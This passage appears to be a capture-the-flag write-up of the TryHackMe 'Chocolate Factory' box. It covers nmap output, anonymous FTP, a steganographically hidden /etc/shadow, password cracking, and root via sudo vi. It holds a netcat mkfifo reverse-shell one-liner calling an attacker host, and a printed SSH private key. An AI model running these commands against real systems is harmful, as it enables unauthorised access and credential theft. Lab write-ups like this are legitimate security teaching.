SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r(Gener
SF:icLines,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 19 20:05:59 2021 -- 1 IP address (1 host up) scanned in 305.45 seconds
```

Lots of information to go through, what stood out though are most of the ports are displaying the same information which shows:

> small hint from Mr.Wonka : Look somewhere else, its not here! ;) 

However on port 113 I saw:

> http://localhost/key_rev_key <- You will find the key here!!!

Other key notes are FTP allows anonymous log in and web server is available on port 80.

### Enumeration

I decided to take a look at port 113 first and see what this key was. I used wget to download the file from the server using the url http://10.10.224.249/key_rev_key. Its an ELF file.

```highlight
└──╼ $file key_rev_key 
key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c
9735121c0a12747aee7ecac1aabaf1f0, not stripped
```

I used strings and found:

Enter your name:
> laksdhfas
>
> congratulations you have found the key:
>
> b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8{REDACTED}'
>
> Keep its safe
>
> Bad name!

```highlight
└──╼ $strings key_rev_key
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
__cxa_finalize
strcmp
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
5j
%l
%j
%b
%Z
%R
%J
%b
=9
AWAVI
AUATL
[]A\A]A^A_
Enter your name:
laksdhfas
 congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
Bad name!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
license.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

I tried to crack the key but no joy, the name was also odd, at this point I decided to enumerate the machine further. Next I looked at FTP, logging in as 'anonymous' as the username and password I can only find one file.

```highlight
└──╼ $ftp 10.10.224.249
Connected to 10.10.224.249.
220 (vsFTPd 3.0.3)
Name (10.10.224.249:daz): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 .
drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.43 secs (478.6774 kB/s)
ftp> exit
221 Goodbye.
```

The image is of gum! 

![gum](/assets/images/chocolatefactory/gum.png)

The image doesn't really help so I decided to check to see if anything was hidden, using steghide I was able to extract a .txt file.

```highlight
└──╼ $steghide --extract -sf gum_room.jpg
Enter passphrase: 
wrote extracted data to "b64.txt".
```

As the name imply its base64.

```highlight
└──╼ $cat b64.txt 
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
 ******************************* {REDACTED } *******************************
```

Decoding I get the output of a /etc/shadow.

```highlight
└──╼ $cat b64.txt | base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

Using hashcat I manage to crack the password. However, I'm unable to log in via SSH. Maybe the password has been changed?

```highlight
└──╼ $ssh charlie@10.10.224.249
charlie@10.10.224.249's password: 
Permission denied, please try again.
```

I moved on to port 80 and had a look at the webserver and got a login page.

![squirrel](/assets/images/chocolatefactory/squirrel.png)

I tried the username Charlie and the cracked password and got in.

![command](/assets/images/chocolatefactory/command.png)

### Initial Access

On http://10.10.224.249/home.php I was able to execute any commands, there didnt appear to be any filters. So I started a netcat listener on my VM with the command 'nc -nvlp 4444' and used a simple nc revershell shell payload on the web page.

> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attacker IP} 4444 >/tmp/f`

Straight away I got a shell.

### Priv Esc

I'm on the box but as www-data, I wanted to become the Charlie user. In /home/charlie I found an RSA key. I copied the contents of teleport to my clipboard and pasted in to a file on my attacking VM.

```highlight
www-data@chocolate-factory:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
 ************************* {REDACTED } *************************
-----END RSA PRIVATE KEY-----
```

With the key, I used chmod to change the permissions (SSH will fail if this is not done) and was able to SSH in to the box as Charlie.

```highlight
└──╼ $chmod 600 charlie
┌─[daz@parrot]─[~/Documents/TryHackMe/Chocolatefactory]
└──╼ $ssh -i charlie charlie@10.10.224.249
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan 19 21:20:23 UTC 2021

  System load:  0.0               Processes:           1207
  Usage of /:   43.8% of 8.79GB   Users logged in:     0
  Memory usage: 49%               IP address for eth0: 10.10.224.249
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$
```

user.txt flag submitted I looked at escalating to root. 'sudo -l' shows I can escalate to root using VI, using [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) I manage to get root.

```highlight
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/$ 
```

Just when I think I've finished I get one more hurdle. When trying to get the root flag I find root.py in its place. I run the script and its asking for a key? I tried 'test' just to see what the scipt would do and it responded with: 'NameError: name 'test' is not defined'. When looking at the ELF file, that had a key - 'VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=', I entered the key and got 'SyntaxError: unexpected EOF while parsing'.

```highlight
root@chocolate-factory:/root# python root.py 
Enter the key:  test
Traceback (most recent call last):
  File "root.py", line 3, in <module>
    key=input("Enter the key:  ")
  File "<string>", line 1, in <module>
NameError: name 'test' is not defined
root@chocolate-factory:/root# python root.py 
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
Traceback (most recent call last):
  File "root.py", line 3, in <module>
    key=input("Enter the key:  ")
  File "<string>", line 1
    -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
                                               ^
SyntaxError: unexpected EOF while parsing
```

Looking at the python script, its a cryptography challenge, I need to enter the key so it can decrypt and provide the output of the variable 'mess' which will likley include the flag.

```highlight
root@chocolate-factory:/root# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
root@chocolate-factory:/root# 
```

I decided the quickest way was to remove the input element of the script and just input the key, I copied the script and called it 'root2.py'.

```highlight
root@chocolate-factory:/root# cat root2.py 
from cryptography.fernet import Fernet
import pyfiglet
key="-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY="
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
root@chocolate-factory:/root# 
```

That worked and I now have the root flag!

```highlight
root@chocolate-factory:/root# python root2.py 
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787{REDACTED}
```

Thanks for reading!